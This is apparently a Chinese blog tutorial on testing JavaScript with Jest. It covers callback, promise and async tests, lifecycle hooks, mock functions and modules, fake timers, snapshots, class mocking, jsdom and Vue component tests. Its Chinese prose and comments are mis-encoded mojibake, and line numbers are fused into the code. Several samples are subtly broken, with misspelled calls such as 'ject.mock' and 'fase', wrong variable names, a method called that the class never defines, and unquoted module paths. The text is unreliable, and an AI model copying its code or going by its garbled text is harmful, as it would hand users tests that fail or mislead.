æµ‹è¯•å¼‚æ­¥ä»£ç å›žè°ƒå½¢å¼ 12345678910111213141516171819202122232425262728293031// fetchData.jsimport request from '@/utils/request';const fetchData = (cb) =&gt; &#123; request('http://www.dell-lee.com/react/api/demo.json').then(res =&gt; &#123; if (res.data) cb(res.data) &#125;)&#125;export default fetchData// fetchData.test.jsimport fetchData from './fetchData'// é”™è¯¯test('fetch è¿”å›žç»“æžœä¸º &#123;success: true&#125;', () =&gt; &#123; fetchData(data =&gt; &#123; expect(data).toEqual(&#123; success: true &#125;) &#125;)&#125;)// å›žè°ƒç±»åž‹å¼‚æ­¥å‡½æ•°test('fetch è¿”å›žç»“æžœä¸º &#123;success: true&#125;', (done) =&gt; &#123; fetchData(data =&gt; &#123; expect(data).toEqual(&#123; success: true &#125;) done(); &#125;)&#125;) Promise 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465// fetchData.jsimport request from '@/utils/request';const fetchData = () =&gt; request('http://www.dell-lee.com/react/api/demo.json')export default fetchData//fetchData.test.jsimport fetchData from './fetchData'// Promisetest('fetch è¿”å›žç»“æžœä¸º &#123;success: true&#125;', () =&gt; &#123; return fetchData().then(res =&gt; &#123; expect(res.data).toEqual(&#123; success: true &#125;) &#125;)&#125;)// æµ‹è¯•404test('fetchData è¿”å›žç»“æžœä¸º404', () =&gt; &#123; // è¦æ±‚è‡³å°‘è·‘ä¸€æ¬¡ expect expect.assertions(1); return fetchData().catch(e =&gt; &#123; expect(e.toString().indexOf('404') &gt; -1).toBe(true) &#125;)&#125;)// .resolves / .rejectstest('fetch è¿”å›žç»“æžœä¸º &#123;success: true&#125;', () =&gt; &#123; return expect(fetchData()).resolves.toMatchObject(&#123; data: &#123; success: true &#125; &#125;)&#125;)test('fetchData è¿”å›žç»“æžœä¸º404', () =&gt; &#123; return expect(fetchData()).rejects.toThrow()&#125;)// Async/Awaittest('fetch è¿”å›žç»“æžœä¸º &#123;success: true&#125;', async () =&gt; &#123; await expect(fetchData()).resolves.toMatchObject(&#123; data: &#123; success: true &#125; &#125;)&#125;)test('fetchData è¿”å›žç»“æžœä¸º404', async () =&gt; &#123; await expect(fetchData()).rejects.toThrow()&#125;)// å¦ä¸€ç§ Async/Awaittest('fetch è¿”å›žç»“æžœä¸º &#123;success: true&#125;', async () =&gt; &#123; const res = await fetchData() expect(res.data).toEqual(&#123; success: true &#125;)&#125;)test('fetchData è¿”å›žç»“æžœä¸º404', async () =&gt; &#123; expect.assertions(1); try &#123; await fetchData() &#125; catch (e) &#123; await expect(e.toString()).toEqual('Error: Request failed with status code 404') &#125;&#125;) é’©å­å‡½æ•°123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778// Couter.jsclass Counter &#123; constructor() &#123; this.number = 0; &#125; addOne() &#123; this.number += 1; &#125; addTwo() &#123; this.number += 2; &#125; minusOne() &#123; this.number -= 1; &#125; minusTwo() &#123; this.number -= 2; &#125;&#125;export default Counter;// Couter.test.jsimport Counter from './Couter';describe('æµ‹è¯• Counter',()=&gt;&#123; let couter; // æ‰€æœ‰æµ‹è¯•å¼€å§‹ä¹‹å‰ beforeAll(()=&gt;&#123; couter = new Counter(); &#125;) // æ¯ä¸ªæµ‹è¯•ç”¨ä¾‹å¼€å§‹ä¹‹å‰ beforeEach(()=&gt;&#123; // æ¯æ¬¡æµ‹è¯•éƒ½ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„ couter couter = new Counter(); &#125;) // æ¯ä¸ªæµ‹è¯•ç”¨ä¾‹ç»“æŸä¹‹åŽ afterEach(()=&gt;&#123; &#125;) // æ‰€æœ‰æµ‹è¯•ç»“æŸä¹‹åŽ afterAll(()=&gt;&#123; &#125;) describe('æµ‹è¯•å¢žåŠ ç›¸å…³ä»£ç ',()=&gt;&#123; test('æµ‹è¯• Conter ä¸­çš„ addOne æ–¹æ³•', () =&gt; &#123; couter.addOne(); expect(couter.number).toBe(1) &#125;) test('æµ‹è¯• Conter ä¸­çš„ addTwo æ–¹æ³•', () =&gt; &#123; couter.addTwo(); expect(couter.number).toBe(2) &#125;) &#125;) describe('æµ‹è¯•å‡å°‘ç›¸å…³ä»£ç ',()=&gt;&#123; test('æµ‹è¯• Conter ä¸­çš„ minusOne æ–¹æ³•', () =&gt; &#123; couter.minusOne(); expect(couter.number).toBe(-1) &#125;) test('æµ‹è¯• Conter ä¸­çš„ minusTwo æ–¹æ³•', () =&gt; &#123; couter.minusTwo(); expect(couter.number).toBe(-2) &#125;) &#125;) &#125;) describe é‡Œé¢å°±æ˜¯ä¸€ä¸ªä½œç”¨åŸŸï¼ŒåµŒå¥—ä½œç”¨åŸŸå¯ä»¥æœ‰å¤šä¸ªé’©å­å‡½æ•°ï¼Œé’©å­å‡½æ•°æ‰§è¡Œé¡ºåºç”±å¤–åˆ°å†… test.onlyï¼Œåªæ‰§è¡ŒæŸä¸ªæµ‹è¯•ç”¨ä¾‹ 1234567891011describe('æµ‹è¯•å‡å°‘ç›¸å…³ä»£ç ',()=&gt;&#123; test.only('æµ‹è¯• Conter ä¸­çš„ minusOne æ–¹æ³•', () =&gt; &#123; couter.minusOne(); expect(couter.number).toBe(-1) &#125;) test('æµ‹è¯• Conter ä¸­çš„ minusTwo æ–¹æ³•', () =&gt; &#123; couter.minusTwo(); expect(couter.number).toBe(-2) &#125;)&#125;) Mock æ•èŽ·å‡½æ•°çš„è°ƒç”¨ï¼Œthis æŒ‡å‘ï¼Œè°ƒç”¨é¡ºåº è‡ªç”±è®¾ç½®è¿”å›žç»“æžœ æ”¹å˜å†…éƒ¨å‡½æ•°çš„å®žçŽ° åŸºæœ¬æ¨¡æ‹Ÿ-å¯¼å…¥å‡½æ•°1234567891011121314151617181920212223242526272829303132// democonst runCallback = (cb) =&gt; &#123; cb();&#125;export default runCallback//demo.test.jsimport runCallback from './demo';describe('æµ‹è¯• runCallback æ–¹æ³•', () =&gt; &#123; test('runCallbackè¢«è°ƒç”¨,å¹¶åªè°ƒç”¨äº†ä¸€æ¬¡',()=&gt;&#123; // mock å‡½æ•°ï¼Œæ•èŽ·å‡½æ•°çš„è°ƒç”¨ const func = jest.fn(); // æ–¹æ³•è¿”å›žä¸€æ¬¡ å€¼ Hahaï¼ŒmockReturnValueåˆ™æ˜¯éƒ½è¿”å›žï¼Œä¹Ÿå¯ä»¥åœ¨ jest.fn(()=&gt;&#123;return 'Haha'&#125;)å®šä¹‰ func.mockReturnValueOnce('Haha') runCallback(func) expect(func).toBeCalled() expect(func.mock.calls.length).toBe(1) expect(func.mock.results[0].value).toBe('Haha') &#125;)&#125;)console.log(func.mock)/** â— Console console.log src/lesson2/demo.test.js:14 &#123; calls: [ [] ], instances: [ undefined ], invocationCallOrder: [ 1 ], results: [ &#123; type: 'return', value: 'Haha' &#125; ] &#125;*/ ä¿®æ”¹åŽŸæ¥å‡½æ•°çš„è¿”å›ž123456789101112131415161718192021222324// xx.jsimport axios from 'axios'const fetchData = ()=&gt;&#123; axios.get('/').then(res=&gt;res.data)&#125;// (function()&#123;return '123' &#125;)()export default fetchData;// xx.test.jsimport fetchData from './xx.js'import axios from 'axios'ject.mock('axios')test('fetchData æµ‹è¯•',()=&gt;&#123; axios.get.mockResolvedValue(&#123; data:"(function()&#123;return '123' &#125;)()" &#125;) return fetchData().then(data=&gt;&#123; expect(eval(data)).toEqual('123') &#125;)&#125;) __mocks__æ–‡ä»¶å¤¹123456// __mock__/xx.jsconst fetchData = ()=&gt;&#123; return new Promise((resolved,reject)=&gt;&#123; resolve("(function()&#123;return '123' &#125;)()") &#125;)&#125; æŽ¥ç€æ”¹æµ‹è¯•ï¼Œæ¨¡æ‹Ÿå‡½æ•° 123456789101112// xx.test.jsjest.mock('./xx')import fetchData from './xx.js'test('fetchData æµ‹è¯•',()=&gt;&#123; axios.get.mockResolvedValue(&#123; data:"(function()&#123;return '123' &#125;)()" &#125;) return fetchData().then(data=&gt;&#123; expect(eval(data)).toEqual('123') &#125;)&#125;) ä¸Šè¿°å‡½æ•°é¡¶éƒ¨é‚£æ­¥æ¨¡æ‹Ÿä¹Ÿå¯ä»¥é€šè¿‡åœ¨ jest.config.js ä¸­ä¿®æ”¹é…ç½® automockï¼štrue æ”¹ä¸ºè‡ªåŠ¨æ¨¡æ‹Ÿï¼Œé‚£ä¹ˆå¼•å…¥å¯¹åº”çš„å‡½æ•°çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨åŽ» __mocks__æ–‡ä»¶å¤¹é‡Œé¢åŽ»å¯»æ‰¾å¯¹åº”çš„æ¨¡æ‹Ÿå‡½æ•°ã€‚æ³¨æ„ä¸€æ—¦å¼€å¯è¿™ä¸ªé…ç½®ï¼Œéœ€è¦å¯åŠ¨æ‰ä¼šç”Ÿæ•ˆï¼Œå¦å¤–ä¹Ÿä¼šå¯¼è‡´å¾ˆå¤šæµ‹è¯•éœ€è¦é‡æ–°ä¿®æ”¹ã€‚ åŒæ—¶å­˜åœ¨__mocks__ä»¥åŠå¯¼å…¥å‡½æ•°åœ¨åŽŸæ¥ xx.js åŸºç¡€ä¸Šé¢æ–°å¢ž ä¸€ä¸ª getNumberå‡½æ•° 1234567891011121314xx.jsimport axios from 'axios'const fetchData = ()=&gt;&#123; axios.get('/').then(res=&gt;res.data)&#125;// (function()&#123;return '123' &#125;)()const getNumber = ()=&gt; 123export &#123; fetchData, getNumber&#125;; æŽ¥ç€ä¿®æ”¹æµ‹è¯•ç”¨ä¾‹ 123456789101112131415// xx.test.jsjest.mock('./xx')import fetchData from './xx.js'test('fetchData æµ‹è¯•',()=&gt;&#123; axios.get.mockResolvedValue(&#123; data:"(function()&#123;return '123' &#125;)()" &#125;) return fetchData().then(data=&gt;&#123; expect(eval(data)).toEqual('123') &#125;)&#125;)test('getNumber æµ‹è¯•',()=&gt;&#123; expect(getNumber()).toBe(123)&#125;) ä¸Šè¿°ä»£ç ä¼šæŠ¥é”™ï¼ŒgetNumebr æ‰¾ä¸åˆ°å¯¹åº”çš„å‡½æ•°ï¼Œå› ä¸ºæµ‹è¯•ç”¨ä¾‹è¿˜æ˜¯ä¼šåŽ»__mocks__ æ–‡ä»¶å¤¹åŽ»å¯»æ‰¾ getNumberã€‚ä½†æ˜¯æˆ‘ä»¬åªå¸Œæœ›æ¨¡æ‹Ÿå¼‚æ­¥çš„å‡½æ•°ï¼Œå¯¹äºŽåŒæ­¥å‡½æ•°å¸Œæœ›é€šè¿‡å¯¼å…¥çš„æ–¹å¼æ¥æµ‹è¯•ï¼Œé‚£ä¹ˆå°±ä»ŽåŽŸæ¥çš„jsæ–‡ä»¶ä¸­å¯¼å…¥ getNumber 123456789101112131415// xx.test.jsjest.mock('./xx')import fetchData from './xx.js'const &#123; getNumber &#125; = jest.requireActual('./xx')test('fetchData æµ‹è¯•',()=&gt;&#123; axios.get.mockResolvedValue(&#123; data:"(function()&#123;return '123' &#125;)()" &#125;) return fetchData().then(data=&gt;&#123; expect(eval(data)).toEqual('123') &#125;)&#125;)test('getNumber æµ‹è¯•',()=&gt;&#123; expect(getNumber()).toBe(123)&#125;) Mock Timerå†™ä¸€ä¸ª setTimeout å‡½æ•° 123456// timer.jsexport default (cb)=&gt;&#123; setTimeout(()=&gt;&#123; cb() &#125;,3000)&#125; æµ‹è¯•ç”¨ä¾‹ 123456789// timer.test.jsimport timer from './timer'test('timer æµ‹è¯•',(done)=&gt;&#123; timer(()=&gt;&#123; expect(2).toBe(1) done(); &#125;)&#125;) ä¸Šé¢çš„æµ‹è¯•ç”¨ä¾‹ä¼šç›´æŽ¥é€šè¿‡ï¼Œ timeræ˜¯ä¸€ä¸ªå¼‚æ­¥å‡½æ•°ï¼Œå¹¶ä¸ä¼šæ‰§è¡Œå‡½æ•°ä½“å†…çš„å†…å®¹ï¼Œéœ€è¦åƒä¹‹å‰çš„å¼‚æ­¥å‡½æ•°ä¸€æ ·ï¼ŒåŠ ä¸ª done å‚æ•° 12345678import timer from './timer'test('timer æµ‹è¯•',(done)=&gt;&#123; timer(()=&gt;&#123; expect(2).toBe(1) done(); &#125;)&#125;) æŽ¥ç€æµ‹è¯•ç”¨ä¾‹ä¾¿ä¼šè¿è¡Œï¼Œå¹¶æŠ¥é”™ 123456789101112131415161718192021222324252627282930FAIL src/lesson3/timer.test.js (7.997s) â— Console console.error node_modules/_jsdom@11.12.0@jsdom/lib/jsdom/virtual-console.js:29 Error: Uncaught [Error: expect(received).toBe(expected) // Object.is equality Expected: 1 Received: 2] at reportException (F:\èµ–å½¬é¸¿\git-project\usual\Egret-Project\FontendTest\node_modules\_jsdom@11.12.0@jsdom\lib\jsdom\living\helpers\runtime-script-errors.js:66:24) at Timeout.callback [as _onTimeout] (F:\èµ–å½¬é¸¿\git-project\usual\Egret-Project\FontendTest\node_modules\_jsdom@11.12.0@jsdom\lib\jsdom\browser\Window.js:680:7) at ontimeout (timers.js:436:11) at tryOnTimeout (timers.js:300:5) at listOnTimeout (timers.js:263:5) at Timer.processTimers (timers.js:223:10) &#123; Error: expect(received).toBe(expected) // Object.is equality Expected: 1 Received: 2 at toBe (F:\èµ–å½¬é¸¿\git-project\usual\Egret-Project\FontendTest\src\lesson3\timer.test.js:5:15) at cb (F:\èµ–å½¬é¸¿\git-project\usual\Egret-Project\FontendTest\src\lesson3\timer.js:3:5) at Timeout.callback [as _onTimeout] (F:\èµ–å½¬é¸¿\git-project\usual\Egret-Project\FontendTest\node_modules\_jsdom@11.12.0@jsdom\lib\jsdom\browser\Window.js:678:19) at ontimeout (timers.js:436:11) at tryOnTimeout (timers.js:300:5) at listOnTimeout (timers.js:263:5) at Timer.processTimers (timers.js:223:10) matcherResult: &#123; actual: 2, expected: 1, message: [Function], name: 'toBe', pass: false &#125; &#125; ä¹Ÿå¯ä»¥é€šè¿‡æ¨¡æ‹Ÿ timer è¿™ç±»å¼‚æ­¥å‡½æ•°ï¼Œæ¥è¾¾åˆ°ç›®çš„ 123456789101112// timer.test.jsimport timer from './timer'// mock timerjest.useFakeTimers()test('timer æµ‹è¯•',()=&gt;&#123; const fn = jest.fn(); timer(fn) // å¿«é€Ÿè¿è¡Œæ‰€æœ‰Timer jest.runAllTimers(); expect(fn).toHaveBeenCalledTimes(1)&#125;) å¯¹äºŽåµŒå¥— timer å¼‚æ­¥å‡½æ•°ï¼Œjest.runOnlyPendingTimerså¯ä»¥è®©åªæœ€å¤–å±‚çš„ç¬¬ä¸€ä¸ª timer è¿è¡Œã€‚ å¦å¤–è¿˜æœ‰å¿«è¿›æ—¶é—´çš„api,jest.advanceTimersByTime(n) 12345678910// timer.test.jsimport timer from './timer'jest.useFakeTimers()test('timer æµ‹è¯•',()=&gt;&#123; const fn = jest.fn(); timer(fn) jest.advanceTimersByTime(3000) expect(fn).toHaveBeenCalledTimes(1)&#125;) åµŒå¥— timer çš„æµ‹è¯•ç”¨ä¾‹ç»“åˆ é’©å­beforeEachä»¥åŠä¸¤ä¸ªä¸Šé¢è®²çš„apiçš„ä¾‹å­ 12345678910111213141516171819202122232425262728293031// timer.jsexport default (cb)=&gt;&#123; setTimeout(()=&gt;&#123; cb() setTimeout(()=&gt;&#123; cb() &#125;,3000) &#125;,3000)&#125;// timer.test.jsimport timer from './timer'beforeEach(()=&gt;&#123; jest.useFakeTimers()&#125;)test('timer æµ‹è¯•-runAllTimers',()=&gt;&#123; const fn = jest.fn(); timer(fn) jest.runAllTimers(); expect(fn).toHaveBeenCalledTimes(2)&#125;)test('timer æµ‹è¯•-advanceTimersByTime',()=&gt;&#123; const fn = jest.fn(); timer(fn) jest.advanceTimersByTime(3000) expect(fn).toHaveBeenCalledTimes(1) jest.advanceTimersByTime(3000) expect(fn).toHaveBeenCalledTimes(2)&#125;) Mock FuntionsMock å‡½æ•°å¯ä»¥è½»æ¾æµ‹è¯•ä»£ç ä¹‹é—´çš„è¿žæŽ¥â€”â€”å®žçŽ°æ–¹å¼åŒ…æ‹¬ï¼šæ“¦é™¤å‡½æ•°å®žé™…å®žçŽ°ã€æ•èŽ·å¯¹å‡½æ•°çš„è°ƒç”¨ï¼ˆä»¥åŠåœ¨è¿™äº›è°ƒç”¨ä¸­ä¼ é€’çš„å‚æ•°ï¼‰ã€åœ¨ä½¿ç”¨ new å®žä¾‹åŒ–æ—¶æ•èŽ·æž„é€ å‡½æ•°çš„å®žä¾‹ï¼Œå…è®¸æµ‹è¯•æ—¶é…ç½®è¿”å›žå€¼ æ¨¡æ‹Ÿå‡½æ•°æµ‹è¯•å‡½æ•° forEachçš„å†…éƒ¨å®žçŽ°ï¼Œè¿™ä¸ªå‡½æ•°ä¸ºä¼ å…¥çš„æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ è°ƒç”¨ä¸€æ¬¡å›žè°ƒå‡½æ•° 12345function forEach(items,callback)&#123; for(let index=0;index&lt;items.length;index+=1)&#123; callback(item[index]) &#125;&#125; ä¸ºäº†æµ‹è¯•æ­¤å‡½æ•°ï¼Œå¯ä»¥ä½¿ç”¨ä¸€ä¸ª mock å‡½æ•°ï¼Œç„¶åŽæ£€æŸ¥ mock å‡½æ•°çš„çŠ¶æ€æ¥ç¡®ä¿å›žè°ƒå‡½æ•°å¦‚æœŸè°ƒç”¨ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546const mockCallback = jest.fn(x =&gt; 42 + x);forEach([0, 1], mockCallback)// æ­¤mockå‡½æ•°è¢«è°ƒç”¨äº†ä¸¤æ¬¡expect(mockCallback.mock.calls.length).toBe(2)console.log(mockCallback)/** &#123; [Function: mockConstructor] _isMockFunction: true, getMockImplementation: [Function], mock: [Getter/Setter], mockClear: [Function], mockReset: [Function], mockRestore: [Function], mockReturnValueOnce: [Function], mockResolvedValueOnce: [Function], mockRejectedValueOnce: [Function], mockReturnValue: [Function], mockResolvedValue: [Function], mockRejectedValue: [Function], mockImplementationOnce: [Function], mockImplementation: [Function], mockReturnThis: [Function], mockName: [Function], getMockName: [Function] &#125;*/// ç¬¬ä¸€æ¬¡è°ƒç”¨å‡½æ•°æ—¶çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ 0expect(mockCallback.mock.calls[0][0]).toBe(0)console.log(mockCallback.mock)/** &#123; calls: [ [ 0 ], [ 1 ] ], instances: [ undefined, undefined ], invocationCallOrder: [ 1, 2 ], results: [ &#123; type: 'return', value: 42 &#125;, &#123; type: 'return', value: 43 &#125; ] &#125;*/// ç¬¬äºŒæ¬¡è°ƒç”¨å‡½æ•°æ—¶çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯1expect(mockCallback.mock.calls[1][0]).toBe(1)// ç¬¬ä¸€æ¬¡å‡½æ•°è°ƒç”¨çš„è¿”å›žå€¼æ˜¯ 42expect(mockCallback.mock.results[0].value).toBe(42) .mockå±žæ€§æ‰€æœ‰ mock å‡½æ•°éƒ½æœ‰è¿™ä¸ªç‰¹æ®Šçš„ .mockå±žæ€§ï¼Œå®ƒä¿å­˜äº†å…³äºŽæ­¤å‡½æ•°å¦‚ä½•è°ƒç”¨ã€è°ƒç”¨æ—¶çš„è¿”å›žå€¼çš„ä¿¡æ¯ã€‚.mockå±žæ€§è¿˜è¿½è¸ªæ¯æ¬¡è°ƒç”¨æ—¶ thisçš„å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬åŒæ ·ä¹Ÿå¯ä»¥æ£€è§†ï¼ˆinspectï¼‰this 12345678const myMock = jest.fn();const a = new myMock();const b = &#123;&#125;;const bound = myMock.bind(b)bound();console.log(myMock.mock.instances)// [ mockConstructor &#123;&#125;, &#123;&#125; ] æ¨¡æ‹Ÿè¿”å›žå€¼12345678910const myMock = jest.fn();console.log(myMock())// undefinedmyMock .mockReturnValueOnce(10) .mockReturnValueOnce('x') .mockReturnValue(true)console.log(myMock(), myMock(), myMock(), myMock());// 10, 'x', true, true ç»“åˆä¸€äº›å‡½æ•°çµæ´»æ¨¡æ‹Ÿ 12345678910const filterTestFn = jest.fn();filterTestFn.mockReturnValueOnce(true).mockReturnValueOnce(false)const result = [11,12].filter(filterTestFn)console.log(result)// [11]console.log(filterTestFn.mock.calls)// [[11],[12]] æ¨¡æ‹Ÿæ¨¡å—123456789// users.jsimport axios from 'axios'class Users &#123; static call()&#123; return axios.get('/user.json').then(res=&gt;res.data) &#125;&#125;export default Users æ¨¡æ‹Ÿ axios.get è¿”å›žä¸€ä¸ªå‡çš„ response 1234567891011// users.test.jsimport axios from 'axios';import Users from './users';jest.mock(axios);test('should fetch users',()=&gt;&#123; const users = [&#123;name:'Bob'&#125;] const res = &#123;data:users&#125; axios.get.mockResolvedValue(res) return Users.all().then(data=&gt;expect(data).toEqual(users))&#125;) æ¨¡æ‹Ÿå®žçŽ°é€šè¿‡æ¨¡æ‹Ÿå‡½æ•° jest.fnæˆ–è€…mockImplementationOnceæ–¹æ³•æ¥å®Œæˆ 1234const myMockFn = jest.fn(cb=&gt; cb(null,true))myMockFn((err,val)=&gt;console.log(val))// true mockImplementationå½“æ‚¨éœ€è¦å®šä¹‰ä»Žå¦ä¸€ä¸ªæ¨¡å—åˆ›å»ºçš„æ¨¡æ‹Ÿå‡½æ•°çš„é»˜è®¤å®žçŽ°æ—¶ï¼Œè¯¥æ–¹æ³•å¾ˆæœ‰ç”¨ 123456789101112// foo.jsmodule.exports = function()&#123; // some implementation&#125;// test.jsjest.mock('../foo') // è¿™ä¸ªä¼šè‡ªåŠ¨æ¨¡æ‹Ÿconst foo = require('../foo')foo.mockImplementation(()=&gt;42)foo();// 42 å½“éœ€è¦é‡æ–°åˆ›å»ºæ¨¡æ‹Ÿå‡½æ•°çš„å¤æ‚è¡Œä¸ºï¼Œä»¥ä¾¿å¤šä¸ªå‡½æ•°è°ƒç”¨äº§ç”Ÿä¸åŒçš„ç»“æžœæ—¶ï¼Œå¯ä»¥ä½¿ç”¨ mockImplementationOnceæ–¹æ³• 12345678const myMockFn = jest .fn() .mockImplementationOnce(cb =&gt; cb(null,true)) .mockImplementationOnce(cb =&gt; cb(null,fase))myMockFn((err, val) =&gt; console.log(val));// truemyMockFn((err, val) =&gt; console.log(val));// false .mockReturnThis()è¿”å›ž this 123456789const myObj = &#123; myMethod: jest.fn().mockReturnThis(),&#125;// ä¸Žä¸‹é¢å®žçŽ°ç›¸åŒconst otherObj = &#123; myMethod: jest.fn(function()&#123; return this; &#125;)&#125; æ¨¡æ‹Ÿå‡½æ•°åç§°é€‰æ‹©ä¸ºæ¨¡æ‹Ÿå‡½æ•°æä¾›ä¸€ä¸ªåç§°ï¼Œæ”¹åç§°å°†åœ¨æµ‹è¯•é”™è¯¯è¾“å‡ºä¸­æ˜¾ç¤ºï¼Œè€Œä¸æ˜¯ jest.fn()ï¼Œä½¿ç”¨è¿™ä¸ªå¯ä»¥å¿«é€Ÿè¯†åˆ«åœ¨æµ‹è¯•è¾“å‡ºä¸­æŠ¥å‘Šé”™è¯¯çš„æ¨¡æ‹Ÿå‡½æ•° 12345const myMockFn = jest.fn().mockReturnValue('default').mockImplementation(x =&gt; x + 42).mockName('add42') Snapshotå¿«ç…§é€‚åˆæµ‹è¯•é…ç½®æ–‡ä»¶ 123456789101112131415161718// xx.jsexport const generateConfig = () =&gt;&#123; return &#123; server:'http://localhost', port:8080 &#125;&#125;//xx.test.jsimport &#123; generateConfig &#125; from './snopshot';test('æµ‹è¯• generateConfig å‡½æ•°',()=&gt;&#123; expect(generateConfig()).toMatchSnapshot(); expect(generateConfig()).toEqual(&#123; server:'http://localhost', port:8080 &#125;)&#125;) jest --watchAllé‡Œé¢å‡ºçŽ°äº† uã€iæ¨¡å¼åˆ†åˆ«å¯¹åº” æ›´æ–°æ‰€æœ‰çš„å¿«ç…§è·Ÿæ›´æ–°å•ä¸ªå¿«ç…§ å®‰è£… prettier,è¿è¡Œ toMatchInlineSnapshotï¼Œä¼šå°† å¿«ç…§è‡ªåŠ¨å­˜åˆ°ä»£ç ä¸‹é¢ 123456789101112131415test('æµ‹è¯• generateConfig å‡½æ•°', () =&gt; &#123; expect(generateConfig()).toMatchInlineSnapshot( &#123; time: expect.any(Date), &#125;, // ä¸‹é¢æ˜¯è‡ªåŠ¨ç”Ÿæˆçš„ ` Object &#123; "port": 8080, "server": "http://localhost", "time": Any&lt;Date&gt;, &#125; ` );&#125;); ES6 ç±»12345678910111213// util.jsclass Util &#123; init()&#123;&#125; a()&#123; // å¼‚å¸¸å¤æ‚ &#125; b()&#123; // å¼‚å¸¸å¤æ‚ &#125;&#125;export default Util; åœ¨åˆ«çš„å‡½æ•°é‡Œé¢ä½¿ç”¨è¿™ä¸ªç±» 12345678910// useUtil.jsimport Util from './util'const useUtil = (a,b) =&gt;&#123; const util = new Util() util.a(a) util.b(b)&#125;export default useUtil; å†™è¿™ä¸ªä½¿ç”¨ç±»çš„å‡½æ•°çš„æµ‹è¯•ç”¨ä¾‹çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¼šå‘çŽ°è¿™ä¸ªå‡½æ•°å› ä¸ºä½¿ç”¨åˆ°äº†ç±»é‡Œé¢çš„å‡½æ•°ï¼Œè€Œå‡½æ•°åˆå¾ˆå¤æ‚ï¼Œç›´æŽ¥è°ƒç”¨ä¼šæŸè€—æ€§èƒ½ã€‚æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ç”¨å‡ ç§æ–¹æ³•æ¥æ¨¡æ‹Ÿ 1234567891011121314151617181920212223242526// useUtil.test.jsjest.mock('./util')// jest.mock å‘çŽ° util æ˜¯ä¸€ä¸ªç±»ï¼Œä¼šè‡ªåŠ¨æŠŠç±»çš„æž„é€ å‡½æ•°æ–¹æ³•å˜æˆ jest.fn()// const Util = jest.fn();// Util.a = jest.fn()// Util.b = jest.fn()import Util from './util'import useUtil from './useUtil'test('æµ‹è¯• useUtil',()=&gt;&#123; useUtil(); expect(Util).toHaveBeenCalled(); console.log(Util.mock) expect(Util.mock.instances[0].a).toHaveBeenCalled() expect(Util.mock.instances[0].b).toHaveBeenCalled()&#125;)/** â— Console console.log src/lesson3/useUtil.test.js:12 &#123; calls: [ [] ], instances: [ Util &#123; init: [Function], a: [Function], b: [Function] &#125; ], invocationCallOrder: [ 1 ], results: [ &#123; type: 'return', value: undefined &#125; ] &#125;*/ å¦ä¸€ç§æ–¹æ³•å°±æ˜¯é€šè¿‡åœ¨ __mocks__æ–‡ä»¶å¤¹ä¸­æ¨¡æ‹Ÿ 123456// __mocks__/util.jsconst Util = jest.fn();Util.prototype = jest.fn();Util.prototype = jest.fn();export default Util è¿˜æœ‰ä¸€ç§å†™æ³•ï¼Œæ˜¯åœ¨åŽŸæ¥çš„æµ‹è¯•ç”¨ä¾‹ä¿®æ”¹ 1234567// useUtil.test.jsjest.mock('./util',()=&gt; &#123; const Util = jest.fn(); Util.prototype = jest.fn(); Util.prototype = jest.fn(); return Util;&#125;) DOMæ“ä½œ12345678910111213141516171819// dom.jsimport $ from 'jquery'const addDivToBody = () =&gt;&#123; $('body').append('&lt;div/&gt;')&#125;export default addDivToBody// dom.test.js// node æœ¬èº«ä¸å…·å¤‡ dom// jest åœ¨ node çŽ¯å¢ƒä¸‹æ¨¡æ‹Ÿäº†ä¸€å¥— dom çš„ api,jsDomimport $ from 'jquery'import addDivToBody from addDivToBody;test('æµ‹è¯• addDivToBody',()=&gt;&#123; addDivToBody(); expect($('body').find('div').length).toBe(1)&#125;) TDDï¼ˆæµ‹è¯•é©±åŠ¨å¼€å‘ï¼‰å…¨ç§°ï¼šTest Driven Development å¼€å‘æµç¨‹ï¼ˆRed-Green Developmentï¼‰ ç¼–å†™æµ‹è¯•ç”¨ä¾‹ è¿è¡Œæµ‹è¯•ï¼Œæµ‹è¯•ç”¨ä¾‹æ— æ³•é€šè¿‡æµ‹è¯• ç¼–å†™ä»£ç ï¼Œä½¿æµ‹è¯•ç”¨ä¾‹é€šè¿‡æµ‹è¯• ä¼˜åŒ–ä»£ç ï¼Œå®Œæˆå¼€å‘ é‡å¤ä¸Šè¿°æ­¥éª¤ ä¼˜åŠ¿ é•¿æœŸå‡å°‘å›žå½’ bug ä»£ç è´¨é‡æ›´å¥½ï¼ˆç»„ç»‡ã€å¯ç»´æŠ¤æ€§ï¼‰ æµ‹è¯•è¦†ç›–çŽ‡é«˜ é”™è¯¯æµ‹è¯•ä»£ç ä¸å®¹æ˜“å‡ºçŽ° Vue TDDå¼€å§‹ 1234# å®‰è£…è„šæ‰‹æž¶npm i @vue/cli@3.8.4 -g# å®‰è£…vue,å¯ä»¥é€‰æ‹©é»˜è®¤é…ç½®ï¼Œä¹Ÿå¯ä»¥è‡ªå®šä¹‰é…ç½®vue create vue-jest @vue/test-utils123456789101112131415161718192021222324252627// HelloWorld.test.jsimport &#123; shallowMount &#125; from '@vue/test-utils'import HelloWorld from '@/components/HelloWorld.vue'describe('HelloWorld.vue', () =&gt; &#123; /** å¦‚æžœä¸ä½¿ç”¨ @vue/test-utils * import Vue from 'vue' * it('renders props.msg when passed', () =&gt; &#123; const root = document.createElement('div') root.className = 'root' document.body.appendChild(root) new Vue(&#123; render: h =&gt; h(HelloWorld, &#123; props: &#123; msg: 'laibh' &#125; &#125;) &#125;).$mount('.root') expect(document.getElementsByClassName('hello').length).toBe(1) &#125;) */ const msg = 'new message' const wrapper = shallowMount(HelloWorld, &#123; propsData: &#123; msg &#125; &#125;) expect(wrapper.text()).toMatch(msg)&#125;) shallowMountæµ…å±‚æ¸²æŸ“ï¼Œåªæ¸²æŸ“ç¬¬ä¸€å±‚ï¼Œä¸æ¸²æŸ“å­ç»„ä»¶ï¼Œé€‚åˆå•å…ƒæµ‹è¯• mountåˆ™ä¼šæ¸²æŸ“å­ç»„ä»¶ï¼Œé€‚åˆé›†æˆæµ‹è¯• å¼€å‘ 